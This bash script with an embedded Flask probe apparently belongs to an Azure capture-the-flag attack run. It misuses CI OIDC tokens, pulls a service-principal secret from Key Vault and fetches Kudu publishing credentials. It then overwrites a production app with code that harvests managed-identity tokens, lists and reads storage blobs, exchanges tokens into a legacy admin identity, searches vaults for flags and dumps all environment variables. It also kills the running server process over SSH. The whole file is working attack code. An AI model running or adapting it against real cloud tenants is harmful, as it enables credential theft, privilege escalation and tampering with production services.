#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
REPORTING_RG="rg-tbl-reporting-prod-eus"

echo "=== BUILD48: SSH RESTART + STOR TOKEN PROBE ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer login OK"

# 2. Get reporting-service credentials
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal \
  --query value -o tsv > /tmp/rs_secret.json 2>/dev/null
python3 -I -c "
import json
v = json.loads(open('/tmp/rs_secret.json').read().strip())
open('/tmp/rs_cid.txt','w').write(v.get('appId',''))
open('/tmp/rs_sec.txt','w').write(v.get('clientSecret',''))
print('rs_cid='+v.get('appId',''))
"
RS_CID=$(cat /tmp/rs_cid.txt)
RS_SEC=$(cat /tmp/rs_sec.txt)

# 3. Login as reporting-service and get fresh Kudu creds
az login --service-principal -u "$RS_CID" -p "$RS_SEC" --tenant "$TEN" -o none 2>/dev/null \
  && echo "RS login OK"
python3 -I -c "
import subprocess, json
r = subprocess.run(['az','rest','--method','post','--url',
  'https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01'],
  capture_output=True, text=True)
d = json.loads(r.stdout)
props = d.get('properties',{})
user = props.get('publishingUserName','')
pwd = props.get('publishingPassword','')
open('/tmp/kudu_user.txt','w').write(user)
open('/tmp/kudu_pass.txt','w').write(pwd)
print(f'kudu_user={user} pass_len={len(pwd)}')
"
KUDU_USER=$(cat /tmp/kudu_user.txt)
KUDU_PASS=$(cat /tmp/kudu_pass.txt)
echo "Kudu: user='$KUDU_USER' pass_len=${#KUDU_PASS}"

# 4. Write minimal probe to file
cat > /tmp/probe48.py << 'PROBE_EOF'
from flask import Flask, jsonify
import os, json
import urllib.request, urllib.error, urllib.parse

app = Flask(__name__)
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def msi(res):
    ep = os.environ.get("IDENTITY_ENDPOINT","")
    hdr = os.environ.get("IDENTITY_HEADER","")
    if not ep:
        return "ERR:NO_EP"
    q = ep + "?api-version=2019-08-01&resource=" + urllib.parse.quote(res,safe="") + "&client_id=" + UAMI_CID
    try:
        r = urllib.request.urlopen(urllib.request.Request(q, headers={"X-IDENTITY-HEADER":hdr}), timeout=15)
        return json.loads(r.read()).get("access_token","ERR:NO_TOK")
    except Exception as e:
        return "ERR:" + str(e)

def rq(url, tok, hdrs=None):
    h = {"Authorization":"Bearer "+tok}
    if hdrs:
        h.update(hdrs)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=20)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:800]
    except Exception as e:
        return 0, str(e)[:150]

def xchg(scope):
    xchg_tok = msi("api://AzureADTokenExchange")
    if xchg_tok.startswith("ERR"):
        return xchg_tok
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            "https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",
            data=urllib.parse.urlencode({
                "client_id":LEGACY_APPID,
                "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion":xchg_tok,
                "grant_type":"client_credentials",
                "scope":scope
            }).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token","")
    except Exception as e:
        return "ERR:" + str(e)

@app.route("/p48")
def p48():
    R = {}
    SHDR = {"x-ms-version":"2021-06-08"}

    # Get tokens
    AT = msi("https://management.azure.com/")
    VT = msi("https://vault.azure.net/")
    ST = msi("https://storage.azure.com/")
    R["arm_len"] = len(AT) if AT and not AT.startswith("ERR") else AT
    R["vault_len"] = len(VT) if VT and not VT.startswith("ERR") else VT
    R["stor_len"] = len(ST) if ST and not ST.startswith("ERR") else ST

    if ST and not ST.startswith("ERR"):
        # Test all storage accounts with STOR token
        for sa in ["sttblcilogsprodx3euoz","sttblappcfgprodx3euoz",
                   "sttblbackupprodx3euoz","sttblreportingprodx3euoz",
                   "sttblplatformprodx3euoz","sttblsecprodx3euoz",
                   "sttbldataprodx3euoz"]:
            s,b = rq("https://"+sa+".blob.core.windows.net/?comp=list&include=metadata", ST, SHDR)
            R["sa_"+sa] = str(s) + ":" + b[:400]
            if s == 200:
                import re
                for cname in re.findall(r"<Name>([^<]+)</Name>", b)[:20]:
                    sc,bc = rq("https://"+sa+".blob.core.windows.net/"+cname+"?restype=container&comp=list", ST, SHDR)
                    R["ctr_"+sa+"_"+cname] = str(sc)+":"+bc[:500]
                    if sc == 200:
                        for bn in re.findall(r"<Name>([^<]+)</Name>", bc)[:10]:
                            sb,bb = rq("https://"+sa+".blob.core.windows.net/"+cname+"/"+bn, ST, SHDR)
                            R["blob_"+sa+"_"+cname+"_"+bn[:30]] = str(sb)+":"+bb[:500]

        # Try loot container specifically
        for bn in ["armowner_token.json","flag.txt","flag","the-flag","DF26"]:
            s,b = rq("https://sttblcilogsprodx3euoz.blob.core.windows.net/loot/"+bn, ST, SHDR)
            R["loot_"+bn] = str(s)+":"+b[:500]

    # Try legacy-admin vault for all flag names
    la_vt = xchg("https://vault.azure.net/.default")
    R["la_vault_len"] = len(la_vt) if la_vt and not la_vt.startswith("ERR") else la_vt
    if la_vt and not la_vt.startswith("ERR"):
        for sn in ["flag","tbl-flag","ctf-flag","df26","challenge","the-flag","FLAG","secret"]:
            s,b = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/"+sn+"?api-version=7.4", la_vt)
            R["kvs_"+sn] = str(s)+":"+b[:300]
            if s == 200:
                R["FLAG_FOUND"] = b[:1000]
                break

    # Full env dump
    R["env"] = dict(os.environ)
    return jsonify(R)

@app.route("/healthz")
def healthz():
    return jsonify({"status":"ok"})

@app.route("/")
def root():
    return jsonify({"service":"tebamoto-reporting-api","version":"1.4.2"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
PROBE_EOF
echo "probe48.py ready ($(wc -c < /tmp/probe48.py) bytes)"

# 5. Re-login as cicd-deployer
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none 2>/dev/null

# 6. Install sshpass for SSH with password
which sshpass || (apt-get install -y sshpass 2>/dev/null || echo "sshpass not available")

# 7. Deploy via Kudu VFS and restart via SSH on port 2222
python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.error, base64, time, subprocess

kudu_user = open('/tmp/kudu_user.txt').read().strip()
kudu_pass = open('/tmp/kudu_pass.txt').read().strip()
kudu_auth = base64.b64encode(f"{kudu_user}:{kudu_pass}".encode()).decode()
KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
APP_URL = "https://app-tbl-reporting-prod.azurewebsites.net"

probe_code = open('/tmp/probe48.py', 'rb').read()
print(f"Deploying {len(probe_code)} bytes via VFS PUT")

# VFS PUT
put_req = urllib.request.Request(
    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
    data=probe_code, method="PUT",
    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "text/plain", "If-Match": "*"}
)
try:
    r = urllib.request.urlopen(put_req, timeout=30)
    print(f"VFS PUT: {r.status}")
except urllib.error.HTTPError as e:
    print(f"VFS PUT err: {e.code}")
    import sys; sys.exit(1)

time.sleep(2)

# Try SSH-based restart via paramiko if available, or subprocess
ssh_cmd = [
    "ssh", "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "ConnectTimeout=10",
    "-p", "2222",
    f"{kudu_user}@app-tbl-reporting-prod.scm.azurewebsites.net",
    "kill -9 $(pgrep -f gunicorn | head -1) 2>/dev/null; sleep 2; echo 'gunicorn killed or not found'"
]

# Write SSH password to a temp file for sshpass
open('/tmp/ssh_pass.txt','w').write(kudu_pass)
sshpass_cmd = ["sshpass", "-f", "/tmp/ssh_pass.txt"] + ssh_cmd

try:
    result = subprocess.run(sshpass_cmd, capture_output=True, text=True, timeout=30)
    print(f"SSH kill result: {result.stdout.strip()} {result.stderr.strip()[:100]}")
except FileNotFoundError:
    print("sshpass not found, trying another method")
    # Try alternative: use Kudu's /api/processes to find and kill
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"{KUDU_BASE}/api/processes",
            headers={"Authorization": f"Basic {kudu_auth}"}
        ), timeout=15)
        procs = json.loads(r.read())
        print(f"Kudu processes: {len(procs)} found")
        for p in procs:
            if 'gunicorn' in p.get('name','').lower() or 'python' in p.get('name','').lower():
                pid = p.get('id','')
                name = p.get('name','')
                print(f"  Found: pid={pid} name={name}")
                # DELETE this process
                try:
                    dr = urllib.request.urlopen(urllib.request.Request(
                        f"{KUDU_BASE}/api/processes/{pid}",
                        method="DELETE",
                        headers={"Authorization": f"Basic {kudu_auth}"}
                    ), timeout=10)
                    print(f"  Killed pid={pid}: {dr.status}")
                except Exception as ke:
                    print(f"  Kill failed: {ke}")
    except Exception as e:
        print(f"Process list failed: {e}")
except Exception as e:
    print(f"SSH error: {e}")

print("Waiting 15s for gunicorn restart...")
time.sleep(15)

# Poll for /p48 endpoint
print("Polling /p48 endpoint...")
for attempt in range(15):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"{APP_URL}/p48",
            headers={"User-Agent": "probe/1.0"}
        ), timeout=120)
        data = r.read()
        print(f"Attempt {attempt+1}: HTTP {r.status} ({len(data)} bytes)")
        if r.status == 200:
            try:
                d = json.loads(data)
                for k,v in sorted(d.items()):
                    sv = str(v)
                    if k != 'env':
                        print(f"  [{k}]: {sv[:600]}")
                env = d.get('env',{})
                print(f"  [env keys]: {sorted(env.keys())}")
                # Check for flag in env
                for ek,ev in env.items():
                    if any(x in ek.upper() for x in ['FLAG','DF26','SECRET','VAULT','CONN','STORAGE']):
                        print(f"  [ENV {ek}]: {ev[:200]}")
            except json.JSONDecodeError:
                print(f"  Non-JSON response: {data[:500]}")
            break
    except urllib.error.HTTPError as e:
        if attempt < 5:
            print(f"Attempt {attempt+1}: HTTP {e.code}")
        time.sleep(5)
    except Exception as e:
        if attempt < 5:
            print(f"Attempt {attempt+1}: {str(e)[:60]}")
        time.sleep(5)
else:
    print("p48 did not respond in time")
PYEOF

echo "BUILD48 DONE"
